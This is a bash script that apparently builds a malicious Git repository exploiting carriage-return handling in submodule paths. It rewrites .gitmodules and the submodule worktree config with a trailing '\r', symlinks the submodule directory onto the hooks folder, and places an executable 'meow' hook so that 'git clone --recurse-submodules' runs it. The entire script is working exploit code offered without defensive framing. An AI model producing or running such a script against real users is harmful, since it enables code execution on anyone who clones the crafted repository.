#!/usr/bin/env bash
set -e

if [ ! -d sub ]; then
    git clone https://github.com/etum-dev/OS-tan.git sub
else
    git -C sub pull
fi

chmod +x sub/meow
git -C sub add meow
git -C sub commit -m hook || true
git -C sub push origin HEAD

rm -rf repo
git init repo
git -C repo -c protocol.file.allow=always submodule add https://github.com/etum-dev/OS-tan.git sub

git -C repo mv sub "$(printf 'sub\r')"

git config -f repo/.gitmodules --unset submodule.sub.path
printf "\tpath = \"sub\r\"\n" >> repo/.gitmodules

git config -f repo/.git/modules/sub/config --unset core.worktree
printf "[core]\n\tworktree = \"../../../sub\r\"\n" >> repo/.git/modules/sub/config

ln -s .git/modules/sub/hooks repo/sub

git -C repo add -A
git -C repo commit -m submodule

git -c protocol.file.allow=always clone --recurse-submodules repo bad-clone

